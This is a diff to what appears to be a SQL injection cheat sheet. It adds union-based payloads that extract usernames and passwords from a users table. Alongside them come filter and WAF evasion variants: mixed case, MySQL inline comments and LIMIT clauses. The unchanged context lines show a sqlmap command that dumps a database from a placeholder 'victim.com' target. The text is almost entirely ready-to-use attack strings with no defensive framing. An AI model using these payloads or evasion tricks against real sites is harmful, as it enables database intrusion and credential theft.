@@ -12,3 +12,29 @@ If the columns align correctly, this will return usernames & passwords in the we
 sqlmap Command:
 
 sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=U --dump
+
+
+----------------------------------------------------------------------------------------
+
+Union-Based SQLi
+
+Normal Payload:
+
+' UNION SELECT null,username,password FROM users--
+
+
+Bypass Tricks:
+
+Case variation:
+
+UnIoN SeLeCt null,username,password FrOm users--
+
+
+Use /*! ... */ MySQL inline comments (executes inside MySQL but bypasses filters):
+
+' /*!UNION*/ /*!SELECT*/ null,username,password /*!FROM*/ users--
+
+
+Add LIMIT to avoid WAF triggers:
+
+' UNION SELECT username,password,null FROM users LIMIT 1--
